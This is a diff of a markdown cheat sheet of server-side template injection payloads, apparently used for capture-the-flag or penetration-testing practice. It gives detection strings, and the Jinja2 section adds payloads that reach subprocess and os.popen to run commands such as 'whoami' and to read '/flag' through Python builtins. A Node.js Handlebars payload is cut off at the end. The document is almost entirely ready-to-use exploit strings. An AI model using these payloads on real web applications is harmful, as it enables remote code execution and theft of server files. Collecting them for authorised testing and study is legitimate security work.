@@ -1,18 +1,26 @@
 # Server-Side Template Injection (SSTI)
+
 ```
 ${{<%[%'"}}%    # Special characteres for detection
 {{7*7}}
-
 ```
+
 ## Python
+
 ### Jinja2
+
 ```
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.open("/flag").read() }}
+{{ get_flashed_messages.__globals__.__builtins__.open("/flag").read() }}
 ```
+
 Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
-## Node.js Express middleware 
+## Node.js Express middleware
+
 ```
 {{#with "s" as |string|}}
 	{{#with "e"}}
